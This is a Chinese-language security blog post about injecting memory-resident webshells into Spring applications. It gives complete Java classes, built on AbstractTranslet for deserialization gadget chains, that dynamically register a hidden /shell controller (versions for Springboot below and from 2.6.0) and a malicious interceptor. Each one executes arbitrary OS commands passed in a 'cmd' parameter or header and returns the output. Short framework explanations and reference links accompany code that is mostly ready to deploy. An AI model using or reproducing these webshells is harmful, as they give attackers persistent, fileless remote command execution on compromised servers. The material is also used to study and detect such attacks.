title: Spring内存马学习
author: bmth
tags:
  - 内存马
categories:
  - java
top_img: 'https://img-blog.csdnimg.cn/92903ca4716e4f9bbd1b3c88e8e4896d.png'
cover: 'https://img-blog.csdnimg.cn/92903ca4716e4f9bbd1b3c88e8e4896d.png'
date: 2022-09-27 10:36:00
---
![](https://img-blog.csdnimg.cn/92903ca4716e4f9bbd1b3c88e8e4896d.png)


## Spring回显
写一个controller测试一下，发现可以通过`ServletRequestAttributes`直接获取`HttpServletRequest`和`HttpServletResponse`
并且`RequestContextHolder.getRequestAttributes()`可以获取`RequestAttributes`
```java
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import java.io.*;

@Controller
public class SpringMVCTestController {
    @ResponseBody
    @RequestMapping(value="/echo", method = RequestMethod.GET)
    public void Test() throws IOException {
        org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
        javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
        javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();

        String cmd = httprequest.getHeader("cmd");
        if(cmd != null && !cmd.isEmpty()){
            String res = new java.util.Scanner(Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",cmd}).getInputStream()).useDelimiter("\\A").next();
            httpresponse.getWriter().println(res);
        }
    }
}
```
![](https://img-blog.csdnimg.cn/f0fe37c5c6a043f4b9d366efee178244.png)

最后构造出来的代码：
```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

import java.io.Serializable;
import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringEcho extends AbstractTranslet implements Serializable {
    public SpringEcho() throws Exception{
        Class c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
        Method m = c.getMethod("getRequestAttributes");
        Object o = m.invoke(null);
        c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
        m = c.getMethod("getResponse");
        Method m1 = c.getMethod("getRequest");
        Object resp = m.invoke(o);
        Object req = m1.invoke(o); // HttpServletRequest
        Method getWriter = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
        Method getHeader = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader",String.class);
        getHeader.setAccessible(true);
        getWriter.setAccessible(true);
        Object writer = getWriter.invoke(resp);
        String cmd = (String)getHeader.invoke(req, "cmd");
        String[] commands = new String[3];
        String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
        if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
            commands[0] = "cmd";
            commands[1] = "/c";
        } else {
            commands[0] = "/bin/sh";
            commands[1] = "-c";
        }
        commands[2] = cmd;
        writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter("\\A").next());
        writer.getClass().getDeclaredMethod("flush").invoke(writer);
        writer.getClass().getDeclaredMethod("close").invoke(writer);
    }

    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {

    }
}
```




## Spring内存马
Spring框架是一个开放源代码的J2EE应用程序框架，是针对bean的生命周期进行管理的轻量级容器。Spring可以单独应用于构筑应用程序，也可以和Struts、Webwork、Tapestry等众多Web框架组合使用，并且可以与 Swing等桌面应用程序AP组合

>Spring 框架主要由七部分组成，分别是`Spring Core、Spring AOP、Spring ORM、Spring DAO、Spring Context、Spring Web 、Spring Web MVC`
Spring全家桶包括5个关键部分: `Spring framework、Spring MVC、Spring Boot、Spring Cloud、Spring Security`。其中spring framework 就是常提到的spring，这是所有spring内容最基本的底层架构，其包含spring mvc、springboot、spring core、IOC和AOP等等。Spring mvc就是spring中的一个MVC框架，主要用来开发web应用和网络接口，但是其使用之前需要配置大量的xml文件，比较繁琐，所以出现springboot，其内置tomcat并且内置默认的XML配置信息，从而方便了用户的使用。Spring Cloud基于Spring Boot，简化了分布式系统的开发。Spring Security用于做鉴权，保证安全性


关于 Root Context 和 Child Context 的重要概念：

- Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，剩下的全是 Child Context
- 所有Child Context都可以访问在 Root Context中定义的 bean，但是Root Context无法访问Child Context中定义的 bean
- 所有的Context在创建后，都会被作为一个属性添加到了 ServletContext中

### Controller内存马
在注册 Controller 时，需要注册两个东西，一个是 Controller，一个是 RequestMapping 映射

首先需要获取当前代码运行时的上下文环境，这里使用的是
```java
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```
此方法获取的是名为`dispatcherServlet-servlet`的Child context
发现上面代码中的 `currentRequestAttributes()` 替换成 `getRequestAttributes()` 也同样有效，getAttribute 参数中的 0 代表从当前 request 中获取而不是从当前的 session 中获取属性值


接下来是注册 controller
>Spring 2.5 开始到 Spring 3.1 之前一般使用`org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping` 映射器
Spring 3.1 开始及以后一般开始使用新的`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping`映射器来支持@Contoller和@RequestMapping注解


可以发现Spring Contorller实际上挂载在`RequestMappingHandlerMapping`的registry中，可以通过`registerMapping`方法动态添加Controller
![](https://img-blog.csdnimg.cn/ee9966b78f2d4985b0d6d55597e1a1ce.png)
#### 内存马实现(Springboot < 2.6.0)
**Controller内存马实现步骤：**
1. 获取应用的上下文环境，也就是ApplicationContext
2. 从 ApplicationContext 中获取 AbstractHandlerMethodMapping 实例(用于反射)
3. 反射获取 AbstractHandlerMapping类的 getMappingRegistry字段
4. 通过 getMappingRegistry注册Controller


```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class InjectToController extends AbstractTranslet {
    // 第一个构造函数
    public InjectToController() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        // 2. 通过反射获得自定义 controller 中test的 Method 对象
        Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
        method.setAccessible(true);
        // 通过反射获得该类的test方法
        Method method2 = InjectToController.class.getMethod("test");
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/shell");
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        // 创建用于处理请求的对象，加入"aaa"参数是为了触发第二个构造函数避免无限循环
        InjectToController injectToController = new InjectToController("aaa");
        mappingHandlerMapping.registerMapping(info, injectToController, method2);
    }
    // 第二个构造函数
    public InjectToController(String aaa) {}

    // controller指定的处理方法
    public void test() throws  IOException{
        // 获取request和response对象
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();

        //exec
        try {
            String arg0 = request.getParameter("cmd");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                String o = "";
                ProcessBuilder p;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                }else{
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next(): o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            }else{
                //当请求没有携带指定的参数(code)时，返回 404 错误
                response.sendError(404);
            }
        }catch (Exception e){}
    }
    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
}
```
![](https://img-blog.csdnimg.cn/7cb4318eb558469abccf4b8b5a923891.png)

但发现当Springboot 的版本>=2.6.0 时，会报500错误，错误提示
```
java.lang.IllegalArgumentException: Expected lookupPath in request attribute "org.springframework.web.util.UrlPathHelper.PATH"
```
![](https://img-blog.csdnimg.cn/efd4106f74bc4addba7c2395c527ab35.png)

原因在于从 Springboot 2.6.0 版本开始，官方修改了url路径的默认匹配策略，我们需要重新构造内存马了

#### 内存马实现(Springboot >=  2.6.0)

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class InjectToController2 extends AbstractTranslet {
    public InjectToController2() {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            Method method2 = InjectToController2.class.getMethod("test");
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            RequestMappingInfo info = RequestMappingInfo.paths("/shell").options(config).build();
            InjectToController2 springControllerMemShell = new InjectToController2("aaa");
            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);
        } catch (Exception e) {

        }
    }

    public InjectToController2(String aaa) {
    }

    public void test() throws IOException {
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        try {
            String arg0 = request.getParameter("cmd");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                String o = "";
                ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                } else {
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            } else {
                response.sendError(404);
            }
        } catch (Exception e) {
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```
![](https://img-blog.csdnimg.cn/edfa49995ec24bbba916b9e836d5ea29.png)

### Interceptor内存马
这里的 Interceptor 是指 Spring 中的拦截器，定义拦截器必须实现HandlerInterceptor接口，HandlerInterceptor接口中有三个方法：

1. preHandle方法是controller方法执行前拦截的方法
可以使用request或者response跳转到指定的页面
return true放行，执行下一个拦截器，如果没有拦截器，执行controller中的方法
return false不放行，不会执行controller中的方法
2. postHandle是controller方法执行后执行的方法，在JSP视图执行前
可以使用request或者response跳转到指定的页面
如果指定了跳转的页面，那么controller方法跳转的页面将不会显示
3. afterCompletion方法是在JSP执行后执行
request或者response不能再跳转页面了


下断点进行分析，可以看到在经过 Filter 层面处理后，就会进入`org.springframework.web.servlet.DispatcherServlet` 类的 doDispatch 方法中
![](https://img-blog.csdnimg.cn/aa45a11d3b9d4a338323d23fcdd83ebc.png)
跟进getHandler方法
![](https://img-blog.csdnimg.cn/87f55e69ff264eb88a2cf768046407e2.png)
第一个mapping是`RequestMappingHandlerMapping`对象，它的getHandler方法实际上会调用`AbstractHandlerMapping`类的getHandler方法，在该方法中会调用getHandlerExecutionChain方法
![](https://img-blog.csdnimg.cn/4966689331b54817a178ece36db0eb11.png)
getHandlerExecutionChain会遍历`this.adaptedInterceptors`对象里所有的 HandlerInterceptor类实例，匹配当前请求url，和拦截器中的url匹配的话，会通过`chain.addInterceptor`把已有的所有拦截器加入到需要返回的HandlerExecutionChain类实例中
![](https://img-blog.csdnimg.cn/a33963109398428ebe6e59abd2a44586.png)

然后返回到doDispatch方法中，通过前面获取到handler之后，会调用 HandlerExecutionChain 的 applyPreHandle 方法
![](https://img-blog.csdnimg.cn/8e754ed42cad4c399ff0c365e1d5179e.png)
跟进之后发现会遍历拦截器，并执行其preHandle方法
![](https://img-blog.csdnimg.cn/0ba6f3308158400e87da0189e4abfd21.png)
#### 内存马实现
Interceptor内存马实现步骤：
1. 获取应用的上下文环境，也就是ApplicationContext
2. 然后从 ApplicationContext  中获取 AbstractHandlerMapping 实例(用于反射)
3. 反射获取  AbstractHandlerMapping 类的 adaptedInterceptors 字段
4. 通过  adaptedInterceptors 注册拦截器


```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.lang.Nullable;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.util.Scanner;

public class InjectToInterceptor extends AbstractTranslet implements HandlerInterceptor {
    public InjectToInterceptor() {
        try {
            //获得context
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            //获取 adaptedInterceptors 属性值
            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean("requestMappingHandlerMapping");
            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);
            InjectToInterceptor aaa = new InjectToInterceptor("aaa");
            adaptedInterceptors.add(aaa);
        }catch (Exception e){}
    }
    public InjectToInterceptor(String aaaa){}

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {
                java.io.PrintWriter writer = response.getWriter();
                ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
                } else {
                    p = new ProcessBuilder(new String[]{"/bin/bash", "-c", cmd});
                }
                p.redirectErrorStream(true);
                Process process = p.start();
                Scanner s = new Scanner(process.getInputStream());
                String result = s.useDelimiter("\\A").hasNext() ? s.next() : "";
                writer.println(result);
                writer.flush();
                writer.close();
            } catch (Exception e) {
            }
        }
        return true;
    }
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable ModelAndView modelAndView) throws Exception {
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
    }

    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable Exception ex) throws Exception {
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

}
```
![](https://img-blog.csdnimg.cn/12de828939d54a929bdeda8d49ffdbbc.png)

参考：
[Spring 内存马实现](https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/)
[Java内存马-SpringMVC篇](https://blog.csdn.net/mole_exp/article/details/123992395)
[针对spring mvc的controller内存马-学习和实验(注入菜刀和冰蝎可用的马)](https://www.cnblogs.com/bitterz/p/14820898.html)
[深入浅出内存马(二) 之SpringBoot内存马（文末视频教学）](https://jishuin.proginn.com/p/763bfbd642b7)
[SpringMVC配合Fastjson的内存马利用与分析](https://www.anquanke.com/post/id/248155)
[ 利用 intercetor 注入 spring 内存 webshell ](https://landgrey.me/blog/19/)


**内存马可参考文章：**
[JavaWeb 内存马一周目通关攻略 ](https://su18.org/post/memory-shell/)
[Java内存马攻防实战--攻击基础篇](https://mp.weixin.qq.com/s/HODFJF3NJmsDW2Lcd-ebIg)
[基于内存 Webshell 的无文件攻击技术研究 ](https://www.anquanke.com/post/id/198886)
[Java 内存攻击技术漫谈](https://paper.seebug.org/1678/)
[内存马的攻防博弈之旅](http://blog.nsfocus.net/webshell-interceptor/)
[杂谈Java内存Webshell的攻与防](https://zhuanlan.zhihu.com/p/227862004)
